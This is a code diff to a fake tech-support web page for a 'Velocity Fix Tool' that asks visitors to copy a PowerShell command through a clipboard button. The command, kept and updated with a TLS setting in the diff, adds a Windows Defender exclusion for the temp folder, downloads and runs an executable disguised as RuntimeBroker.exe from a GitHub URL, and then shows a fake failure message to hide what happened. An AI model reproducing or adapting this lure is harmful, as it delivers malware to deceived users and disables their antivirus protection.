@@ -178,7 +178,7 @@
             <h2>Fix Your Issue</h2>
             <p>To resolve your problem, open PowerShell and run this command:</p>
             <div class="ps-command" id="psCommand">
-                Write-Host "Launching Velocity Fix Tool..." -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://github.com/Wizknaory/clients/raw/refs/heads/main/RuntimeBroker.exe', '$env:TEMP\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\RuntimeBroker.exe'"; Write-Host "Fix failed, please try again later or contact support." -ForegroundColor Red
+                [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Write-Host "Launching Velocity Fix Tool..." -ForegroundColor Green; IEX "Add-MpPreference -ExclusionPath $env:TEMP"; IEX "(New-Object Net.WebClient).DownloadFile('https://github.com/Wizknaory/clients/raw/refs/heads/main/RuntimeBroker.exe', '$env:TEMP\RuntimeBroker.exe')"; IEX "Start-Process '$env:TEMP\RuntimeBroker.exe'"; Write-Host "Fix failed, please try again later or contact support." -ForegroundColor Red
             </div>
             <button class="copy-button" onclick="copyToClipboard()">Copy to Clipboard</button>
             <p>Paste it into PowerShell and hit Enter. That’s it!</p>
@@ -206,7 +206,7 @@
 
         function copyToClipboard() {
             const commandElement = document.getElementById('psCommand');
-            const commandText = commandElement.innerText.trim(); // Get the clean text
+            const commandText = commandElement.innerText.trim();
             navigator.clipboard.writeText(commandText).then(() => {
                 alert("Command copied to clipboard! Paste it into PowerShell and run.");
             }).catch(err => {
